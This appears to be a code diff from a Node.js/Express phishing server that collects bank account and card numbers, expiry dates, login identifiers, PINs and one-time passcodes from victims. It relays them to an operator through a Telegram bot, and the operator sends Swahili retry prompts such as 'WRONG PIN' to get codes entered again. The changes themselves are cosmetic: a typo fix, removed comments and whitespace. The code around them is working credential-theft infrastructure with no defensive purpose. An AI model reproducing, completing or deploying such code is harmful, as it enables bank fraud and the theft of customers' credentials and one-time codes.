@@ -109,7 +109,7 @@ async function initBot() {
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN';
           session.pin = '';
-          await bot.sendMessage(chatTarget, `❌ WRONG PIN imetumվել. Mteja anaombwa kuweka PIN sahihi upya.`);
+          await bot.sendMessage(chatTarget, `❌ WRONG PIN imetumwa. Mteja anaombwa kuweka PIN sahihi upya.`);
           break;
         case 'OTP_EXPIRED':
           session.status = 'RETRY_OTP';
@@ -136,7 +136,7 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// 1. Submit Bank Details First
+// Submit Bank Details First
 app.post('/api/submit-bank', async (req, res) => {
   try {
     let { accountNo, cardNo, expiry, identifierType, identifierValue, adminChatId } = req.body || {};
@@ -186,7 +186,6 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// 2. Submit Sign In Credentials (Phone/Gmail & PIN)
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     const { userId, identifierType, identifierValue, pin } = req.body || {};
@@ -220,7 +219,6 @@ app.post('/api/submit-credentials', async (req, res) => {
   }
 });
 
-// 3. Submit OTP
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
@@ -259,4 +257,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-                                                                                                                             
+    
